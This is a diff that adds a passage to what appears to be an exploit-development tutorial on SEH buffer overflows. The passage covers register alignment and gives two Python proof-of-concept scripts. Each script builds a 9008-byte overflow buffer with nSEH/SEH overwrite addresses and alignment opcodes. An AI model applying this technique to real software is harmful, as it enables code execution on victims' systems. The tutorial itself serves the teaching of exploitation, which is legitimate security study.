@@ -235,4 +235,62 @@ After the 4 bytes are positioned after the padding, the debugger reacts as inten
 
 Note that ESP and EAX contain the same values.
 
-Once this is done, the next step would be to calculate the distance between a desired address, being on this case 
+Once this is done, the next step would be to calculate the distance between a desired address, being on this case 0x000E2560, and the EAX value, which is 0x000E1EE4.
+
+In order to perform the calculation, the Windows calculator will be used:
+
+![](/assets/img/Alignments/5.png)
+
+As seen, the value given by the calculator is 67C. In order to align the EAX value as intended, the 16-bits of the register will be modified (ax), adding the given value, so it lands to the address that was chosen:
+
+```term
+nasm > add ax, 0x67c 
+00000000  66057C06          add ax,0x67c
+nasm > 
+```
+
+With this last step, the alignment part finishes!
+
+Current poc:
+
+```term
+import struct 
+
+alignment = "\x57\x58\x54\x58" # PUSH EDI, POP EAX / PUSH ESP, POP EAX
+alignment += "\x66\x05\x7C\x06" # add ax, 0x67c
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x10031779)
+
+buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + alignment + "\xff" * 200
+f = open ("poc.txt", "w")
+f.write(buffer)
+f.close()
+```
+
+After repeating the explotation process, Immunity reveals that the alignment was processed successfully:
+
+![](/assets/img/Alignments/6.png)
+
+However, the EIP register does not match EAX:
+
+![](/assets/img/Alignments/7.png)
+
+Nonetheless, this matter has an easy solution, just parsing some small padding until the EIP reaches the same address as EAX should be enough. Furthermore, this won't affect EAX, as it is a non-volatile register.
+
+Current poc:
+
+```term
+import struct 
+
+alignment = "\x57\x58\x54\x58" # PUSH EDI, POP EAX / PUSH ESP, POP EAX
+alignment += "\x66\x05\x7C\x06" # add ax, 0x67c
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x10031779)
+
+buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + alignment + "\x41\x49" * 11 + "\xff" * 200
+f = open ("poc.txt", "w")
+f.write(buffer)
+f.close()
+```
